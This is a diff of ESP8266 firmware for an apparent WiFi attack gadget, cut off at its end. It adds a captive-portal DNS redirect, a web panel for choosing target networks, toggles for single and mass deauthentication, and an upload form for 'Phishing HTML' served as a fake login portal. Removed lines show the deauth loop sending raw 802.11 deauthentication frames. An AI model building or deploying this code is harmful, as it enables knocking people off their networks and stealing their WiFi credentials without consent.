@@ -10,8 +10,22 @@ extern "C" {
 int wifi_send_pkt_freedom(uint8* buf, int len, bool sys_seq);
 }
 
-// OLED 64x48
+// Konfigurasi OLED 64x48
 SSD1306Wire display(0x3c, 4, 5, GEOMETRY_64_48);
+
+// Struktur Data Network
+typedef struct {
+  String ssid;
+  uint8_t ch;
+  uint8_t bssid[6];
+  int rssi;
+} _Network;
+
+// Deklarasi Variabel Global (PENTING: Agar tidak error 'not declared')
+const byte DNS_PORT = 53;
+IPAddress apIP(192, 168, 4, 1);
+DNSServer dnsServer;
+ESP8266WebServer webServer(80);
 
 _Network _networks[16];
 _Network _selectedNetwork;
@@ -24,6 +38,17 @@ bool mass_deauth = false;
 bool hotspot_active = false;
 unsigned long now = 0;
 unsigned long deauth_now = 0;
+
+// Helper: Konversi BSSID ke String
+String bytesToStr(const uint8_t* b, uint32_t size) {
+  String str;
+  for (uint32_t i = 0; i < size; i++) {
+    if (b[i] < 0x10) str += "0";
+    str += String(b[i], HEX);
+    if (i < size - 1) str += ":";
+  }
+  return str;
+}
 
 void updateOLED(String status) {
   display.clear();
@@ -39,105 +64,92 @@ void addLog(String msg) {
   _logs = "[" + String(millis()/1000) + "s] " + msg + "\n" + _logs;
 }
 
-// Fungsi Menggambar Bar Sinyal
-String getSignalBar(int rssi) {
-  int quality = 2 * (rssi + 100);
-  if (quality > 100) quality = 100;
-  if (quality < 0) quality = 0;
-  return String(quality) + "%";
+void performScan() {
+  int n = WiFi.scanNetworks();
+  if (n >= 0) {
+    for (int i = 0; i < n && i < 16; ++i) {
+      _networks[i].ssid = WiFi.SSID(i);
+      _networks[i].ch = WiFi.channel(i);
+      _networks[i].rssi = WiFi.RSSI(i);
+      for (int j = 0; j < 6; j++) _networks[i].bssid[j] = WiFi.BSSID(i)[j];
+    }
+  }
 }
 
 void handleUpload() {
   if (webServer.hasArg("html_content")) {
     _customHTML = webServer.arg("html_content");
-    addLog("Custom HTML Uploaded");
+    addLog("HTML Updated");
+    webServer.send(200, "text/plain", "HTML Berhasil Diupload!");
+  } else {
+    webServer.send(400, "text/plain", "Gagal: Isi HTML Kosong");
   }
-  webServer.send(200, "text/html", "OK");
 }
 
 void handleIndex() {
   if (webServer.hasArg("clear_logs")) { _logs = ""; }
+  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "start");
+  if (webServer.hasArg("mass")) mass_deauth = (webServer.arg("mass") == "start");
+  
   if (webServer.hasArg("ap")) {
     for (int i = 0; i < 16; i++) {
       if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
         _selectedNetwork = _networks[i];
+        addLog("Target: " + _selectedNetwork.ssid);
         updateOLED("SEL:" + _selectedNetwork.ssid);
       }
     }
   }
-  
-  // HTML UI dengan CSS Dinamis
-  String html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
-  html += "<style>body{background:#111;color:#0f0;font-family:monospace;} .btn{padding:12px;margin:5px;display:inline-block;text-decoration:none;border-radius:4px;font-weight:bold;}";
-  html += ".on{background:#f00;color:#fff;} .off{background:#0a0;color:#fff;}";
-  html += "table{width:100%;border-collapse:collapse;} td{border-bottom:1px solid #333;padding:8px;}";
-  html += ".bar-bg{background:#333;width:100px;display:inline-block;height:10px;} .bar-fill{background:#0f0;height:10px;}</style></head><body>";
-  
-  html += "<h2>GMPRO V3.9</h2>";
-  
-  // Tombol Dinamis
-  String d_class = deauthing_active ? "on" : "off";
-  html += "<a class='btn " + d_class + "' href='/?deauth=" + (deauthing_active ? "stop" : "start") + "'>DEAUTH</a> ";
-  
-  String m_class = mass_deauth ? "on" : "off";
-  html += "<a class='btn " + m_class + "' href='/?mass=" + (mass_deauth ? "stop" : "start") + "'>MASS</a><br>";
 
-  // WiFi List dengan Bar
-  html += "<h3>WiFi List</h3><table>";
+  String html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>";
+  html += "body{background:#000;color:#0f0;font-family:monospace;padding:10px;}";
+  html += ".btn{padding:10px;margin:5px;display:inline-block;text-decoration:none;border-radius:5px;border:1px solid #0f0;font-weight:bold;}";
+  html += ".on{background:#f00;color:#fff;border:none;} .off{background:#000;color:#0f0;}";
+  html += "table{width:100%;border-collapse:collapse;margin-top:10px;} td{border-bottom:1px solid #222;padding:5px;}";
+  html += "</style></head><body>";
+  
+  html += "<h2>NETHERCAP V3.9</h2>";
+  
+  // Tombol Berubah Warna
+  html += "<a class='btn " + String(deauthing_active ? "on" : "off") + "' href='/?deauth=" + (deauthing_active ? "stop" : "start") + "'>DEAUTH</a>";
+  html += "<a class='btn " + String(mass_deauth ? "on" : "off") + "' href='/?mass=" + (mass_deauth ? "stop" : "start") + "'>MASS</a>";
+
+  html += "<table><tr><th>Ch</th><th>SSID</th><th>Sig</th><th>Action</th></tr>";
   for (int i = 0; i < 16; i++) {
     if (_networks[i].ssid == "") break;
-    int sig = _networks[i].rssi; // Pastikan struct _Network punya rssi
-    html += "<tr><td>CH" + String(_networks[i].ch) + "</td><td>" + _networks[i].ssid + "</td>";
-    html += "<td><div class='bar-bg'><div class='bar-fill' style='width:" + getSignalBar(sig) + "'></div></div></td>";
-    html += "<td><a class='btn off' style='padding:4px' href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>SEL</a></td></tr>";
+    int quality = 2 * (_networks[i].rssi + 100);
+    if(quality > 100) quality = 100;
+    html += "<tr><td>" + String(_networks[i].ch) + "</td><td>" + _networks[i].ssid + "</td><td>" + String(quality) + "%</td>";
+    html += "<td><a class='btn off' style='padding:4px;font-size:10px;' href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>SELECT</a></td></tr>";
   }
   html += "</table>";
 
-  // Logs Area
-  html += "<h3>Logs</h3><pre style='background:#000;padding:10px;height:100px;overflow:scroll;'>" + _logs + "</pre>";
-  html += "<a href='/?clear_logs=1' style='color:#f00'>Clear Logs</a>";
-
-  // Upload Section
-  html += "<h3>Upload Evil HTML</h3><form action='/upload' method='POST'><textarea name='html_content' rows='5' style='width:100%'></textarea><br><input type='submit' value='Apply HTML'></form>";
+  html += "<h3>Logs</h3><pre style='background:#111;padding:5px;height:80px;overflow:auto;font-size:10px;'>" + _logs + "</pre>";
+  html += "<a href='/?clear_logs=1' style='color:#f00;font-size:10px;'>[Clear Logs]</a>";
+  
+  html += "<h3>Phishing HTML</h3><form action='/upload' method='POST'><textarea name='html_content' rows='3' style='width:100%;background:#222;color:#fff;' placeholder='Paste HTML di sini...'></textarea><br><input type='submit' class='btn off' value='Upload HTML'></form>";
   
   html += "</body></html>";
   webServer.send(200, "text/html", html);
 }
 
 void setup() {
+  Serial.begin(115200);
+  pinMode(LED_PIN, OUTPUT);
+  
   display.init();
   display.flipScreenVertically();
-  updateOLED("START");
-  
+  updateOLED("READY");
+
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
-  WiFi.softAP("GMpro_Admin", "sangkur87");
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP("GMpro_Nether", "sangkur87");
   
+  dnsServer.start(DNS_PORT, "*", apIP);
   webServer.on("/", handleIndex);
   webServer.on("/upload", HTTP_POST, handleUpload);
+  webServer.onNotFound(handleIndex);
   webServer.begin();
-  addLog("System Ready");
-}
-
-void loop() {
-  webServer.handleClient();
   
-  // Deauth Engine
-  if ((deauthing_active || mass_deauth) && millis() - deauth_now >= 200) {
-    // Logika Mass Deauth (pindah-pindah channel)
-    static int mass_idx = 0;
-    if(mass_deauth) {
-       _selectedNetwork = _networks[mass_idx];
-       mass_idx = (mass_idx + 1) % 10;
-    }
-
-    wifi_set_channel(_selectedNetwork.ch);
-    uint8_t pkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
-    memcpy(&pkt[10], _selectedNetwork.bssid, 6);
-    memcpy(&pkt[16], _selectedNetwork.bssid, 6);
-    
-    if(wifi_send_pkt_freedom(pkt, 26, 0) == 0) _deauthCount++;
-    deauth_now = millis();
-    updateOLED("ATTACK");
-  }
-}
+  add
